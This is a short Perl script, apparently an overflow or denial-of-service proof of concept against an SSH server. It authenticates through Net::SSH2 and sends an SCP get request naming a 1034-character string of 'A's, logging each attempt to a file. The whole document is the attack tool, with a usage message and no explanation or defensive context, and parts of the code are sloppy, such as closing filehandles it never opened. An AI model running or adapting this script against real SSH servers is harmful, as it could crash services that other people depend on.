#!/usr/bin/perl
 
use Net::SSH2;
use Getopt::Std;
 
@overflow = ('A' x 1034);
 
getopts('H:P:u:p:', \%opts);
$host = $opts{'H'}; $port = $opts{'P'}; $username = $opts{'u'}; $password =
$opts{'p'};
 
if(!defined($host) || !defined($username))
{
     print "\nUsage: $0 -H <host> -P [port] -u <username> -p
[password]\n\n";
     exit(0);
 
}
 
 
print "\SCP Get... Beep, Beep";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port)               || die "\nError: Connection
Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError:
Username/Password Denied!\n";
$fuzzssh = $_; $scpget = $ssh2->scp_get($fuzzssh); $ssh2->disconnect(); }
sleep(1);
 
 
close(FD); close(FDD); close(FDDD); close(FDDDD);
 
exit;